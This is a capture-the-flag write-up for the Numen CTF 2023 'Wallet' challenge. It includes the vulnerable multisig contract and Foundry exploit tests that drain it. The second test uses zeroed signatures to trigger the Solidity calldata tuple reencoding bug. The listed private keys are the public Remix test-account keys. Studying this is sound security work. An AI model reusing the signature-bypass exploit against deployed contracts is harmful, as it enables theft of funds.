# Numen CTF 2023 : Wallet

### Contract code :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract NC is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    address public admin;

    constructor() {
        _mint(msg.sender, 100 * 10**18);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        if (tx.origin == admin) {
            require(msg.sender.code.length > 0);
            _allowances[spender][tx.origin] = amount;
            return;
        }
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

struct Holder {
    address user;
    string name;
    bool approve;
    bytes reason;
}
struct Signature {
    uint8 v;
    bytes32[2] rs;
}
struct SignedByowner {
    Holder holder;
    Signature signature;
}

contract Wallet {
    address[] public owners;
    address immutable public token;
    Verifier immutable public verifier;
    mapping(address => uint256) public contribution;
    address[] public contributors;

    constructor() {
        token = address(new NC());
        verifier = new Verifier();
        initWallet();
    }

    function initWallet() private {
        owners.push(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));
        owners.push(address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2));
        owners.push(address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db));
        owners.push(address(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB));
        owners.push(address(0x617F2E2fD72FD9D5503197092aC168c91465E7f2));
    }

    function deposit(uint256 _amount) public {
        require(_amount > 0, "Deposit value of 0 is not allowed");
        IERC20(token).transferFrom(msg.sender, address(this), _amount);
        if(contribution[msg.sender] == 0){
            contributors.push(msg.sender);
        }
        contribution[msg.sender] += _amount;

    }

    function transferWithSign(address _to, uint256 _amount, SignedByowner[] calldata signs) external {
        require(address(0) != _to, "Please fill in the correct address");
        require(_amount > 0, "amount must be greater than 0");
        uint256 len = signs.length;
        require(len > (owners.length / 2), "Not enough signatures");
        Holder memory holder;
        uint256 numOfApprove;
        for(uint i; i < len; i++){
            holder = signs[i].holder;
            if(holder.approve){
                //Prevent zero address
                require(checkSinger(holder.user), "Signer is not wallet owner");
                verifier.verify(_to, _amount, signs[i]);
            }else{
                continue;
            }
            numOfApprove++;
        }
        require(numOfApprove > owners.length / 2, "not enough confirmation");
        IERC20(token).approve(_to, _amount);
        IERC20(token).transfer(_to, _amount);
    }

    function checkSinger(address _addr) public view returns(bool res){
        for(uint i; i < owners.length; i++){
            if(owners[i] == _addr){
                res = true;
            }
        }
    }

    function isSolved() public view returns(bool){
        return IERC20(token).balanceOf(address(this)) == 0;
    }
    
}

contract Verifier{

    function verify(address _to, uint256 _amount, SignedByowner calldata scoupon) public pure{
        Holder memory holder = scoupon.holder;
        Signature memory sig = scoupon.signature;
        bytes memory serialized = abi.encode(
            _to,
            _amount,
            holder.approve,
            holder.reason
        );
        
        require(ecrecover(keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", serialized)), sig.v, sig.rs[0], sig.rs[1]) == holder.user, "Invalid signature");
    }
}
```

Our goal is to drain all tokens from the multi-sig wallet

There are 5 owners, all of owner's private key is known, as they are the testing account for remix

```
Address: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
Private Key: 503f38a9c967ed597e47fe25643985f032b072db8075426a92110f82df48dfcb

Address: 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
Private Key: 7e5bfb82febc4c2c8529167104271ceec190eafdca277314912eaabdb67c6e5f

Address: 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db
Private Key: cc6d63f85de8fef05446ebdd3c537c72152d0fc437fd7aa62b3019b79bd1fdd4

Address: 0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB
Private Key: 638b5c6c8c5903b15f0d3bf5d3f175c64e6e98a10bdb9768a2003bf773dcb86a

Address: 0x617F2E2fD72FD9D5503197092aC168c91465E7f2
Private Key: f49bf239b6e554fdd08694fde6c67dac4d01c04e0dda5ee11abee478983f3bc0
```

So at first I thought we have to sign 3 signatures with those accounts, and drain it with `transferWithSign()` :

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/NumenWallet.sol";

contract WalletTest is Test {
    Wallet public wallet;
    Verifier public verifier;
    NC public token;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        wallet = new Wallet();
        verifier = Verifier(wallet.verifier());
        token = NC(wallet.token());
    }

    function testAttack() public {
        vm.startPrank(hacker);
        
        address _to = 0xC9d88f58258B264b6110D6D0d4612c3228DaeEfc;
        uint256 _amount = 100 ether; 
        
        // first sig
        Holder memory holder = Holder(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, "", true, hex"1234");
        bytes memory serialized = abi.encode(
            _to,
            _amount,
            holder.approve,
            holder.reason
        );
        bytes32 hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", serialized));
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0x503f38a9c967ed597e47fe25643985f032b072db8075426a92110f82df48dfcb, hash);
        console.log(v);
        console.logBytes32(r);
        console.logBytes32(s);
        
        Signature memory sig;
        sig.v = v;
        sig.rs[0] = r;
        sig.rs[1] = s;
        SignedByowner memory signedByOwner = SignedByowner(holder, sig);
        // verify
        verifier.verify(_to, _amount, signedByOwner);
        //
        
        // second sig
        Holder memory holder2 = Holder(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, "", true, hex"1234");
        bytes memory serialized2 = abi.encode(
            _to,
            _amount,
            holder2.approve,
            holder2.reason
        );
        bytes32 hash2 = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", serialized2));
        
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(0x7e5bfb82febc4c2c8529167104271ceec190eafdca277314912eaabdb67c6e5f, hash2);
        console.log(v2);
        console.logBytes32(r2);
        console.logBytes32(s2);
        
        Signature memory sig2;
        sig2.v = v2;
        sig2.rs[0] = r2;
        sig2.rs[1] = s2;
        SignedByowner memory signedByOwner2 = SignedByowner(holder2, sig2);
        // verify
        verifier.verify(_to, _amount, signedByOwner2);
        
        // third sig
        Holder memory holder3 = Holder(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db, "", true, hex"1234");
        bytes memory serialized3 = abi.encode(
            _to,
            _amount,
            holder3.approve,
            holder3.reason
        );
        bytes32 hash3 = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", serialized3));
        
        (uint8 v3, bytes32 r3, bytes32 s3) = vm.sign(0xcc6d63f85de8fef05446ebdd3c537c72152d0fc437fd7aa62b3019b79bd1fdd4, hash3);
        console.log(v3);
        console.logBytes32(r3);
        console.logBytes32(s3);
        
        Signature memory sig3;
        sig3.v = v3;
        sig3.rs[0] = r3;
        sig3.rs[1] = s3;
        SignedByowner memory signedByOwner3 = SignedByowner(holder3, sig3);
        // verify
        verifier.verify(_to, _amount, signedByOwner3);
        
        
        SignedByowner[] memory signs = new SignedByowner[](3);
        signs[0] = signedByOwner;
        signs[1] = signedByOwner2;
        signs[2] = signedByOwner3;
        console.log(signs[0].holder.user);
        wallet.transferWithSign(_to, _amount, signs);
        
        // check if challenge is solved
        assertTrue(wallet.isSolved());
    }
}
```

However when I'm testing it with foundry, it failed with `Invalid signature`, I have verified every signature with the `Verifier` after I have signed it and it has no error

But when I'm calling `transferWithSign()`, it pass `address(0)` to the `Verifier` instead of the signer's address

```
    │   ├─ [7532] Verifier::verify(0xC9d88f58258B264b6110D6D0d4612c3228DaeEfc, 100000000000000000000, ((0x0000000000000000000000000000000000000000, , true, 0x1234), (27, [0x5062d105627c6342aef1d624fc3f8d36615f4724a4ee613050c26314ea54ddf1, 0x6fd9d1aa7d99eef384d21f0d6891933d84a84582e8017e0cb1f07f86aea5aee4]))) [staticcall]
    │   │   ├─ [0] console::log(logging2: , 0x0000000000000000000000000000000000000000) [staticcall]
    │   │   │   └─ ← ()
    │   │   ├─ [3000] PRECOMPILE::ecrecover(0x64e6cb2b7ca6e61d0d9d5f358a688a2536100323377594138ea9eb5cbca9edbb, 27, 36359621509167580027990157587673816812412648879299812063010969293301164072433, 50591579067204252140133092307497070864236686392315526924229666023886297607908) [staticcall]
    │   │   │   └─ ← 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
    │   │   └─ ← "Invalid signature"
    │   └─ ← "Invalid signature"
    └─ ← "Invalid signature"
```

While I was still figuring out the reason of this, my teammates have solved this, so I just moved on to other challenges in the CTF

My teammate showed me this bug, which is the reason for that : 
https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/

After the CTF, as the challenges are down, I have to try it on foundry

Actually this bug make it even easier to solve the challenge, as we don't even have to sign any signature at all, we can just pass an invalid signature and `ecrecover` will return address(0)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/NumenWallet.sol";

contract WalletTest is Test {
    Wallet public wallet;
    Verifier public verifier;
    NC public token;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        wallet = new Wallet();
        verifier = Verifier(wallet.verifier());
        token = NC(wallet.token());
    }

    function testAttack() public {
        vm.startPrank(hacker);
        
        // first sig
        Holder memory holder = Holder(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, "", true, hex"1234");
        Signature memory sig;
        sig.v = 0;
        sig.rs[0] = bytes32(0);
        sig.rs[1] = bytes32(0);
        SignedByowner memory signedByOwner = SignedByowner(holder, sig);
        
        // second sig
        Holder memory holder2 = Holder(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, "", true, hex"1234");
        Signature memory sig2;
        sig2.v = 0;
        sig2.rs[0] = bytes32(0);
        sig2.rs[1] = bytes32(0);
        SignedByowner memory signedByOwner2 = SignedByowner(holder2, sig2);
        
        // third sig
        Holder memory holder3 = Holder(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db, "", true, hex"1234");
        Signature memory sig3;
        sig3.v = 0;
        sig3.rs[0] = bytes32(0);
        sig3.rs[1] = bytes32(0);
        SignedByowner memory signedByOwner3 = SignedByowner(holder3, sig3);
        
        
        SignedByowner[] memory signs = new SignedByowner[](3);
        signs[0] = signedByOwner;
        signs[1] = signedByOwner2;
        signs[2] = signedByOwner3;
        wallet.transferWithSign(0xC9d88f58258B264b6110D6D0d4612c3228DaeEfc, 100 ether, signs);
        
        // check if challenge is solved
        assertTrue(wallet.isSolved());
    }
}
```

This challenge will be a lot harder if the owner's private key are not publicly known, that we have to figure out the bug to drain the multi-sig wallet

